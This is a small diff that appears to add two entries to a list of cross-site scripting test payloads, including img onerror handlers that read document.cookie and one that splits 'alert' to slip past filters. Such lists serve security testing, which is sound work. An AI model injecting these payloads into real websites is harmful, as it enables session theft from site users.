@@ -139,3 +139,5 @@ prompt(123)
 prompt("test")
 prompt(document.cookie)
 prompt(document.domain)
+<img src=x onerror=window["al"+"ert"](document.cookie)>
+<img src=x onerror=window["prompt"](document.cookie)>
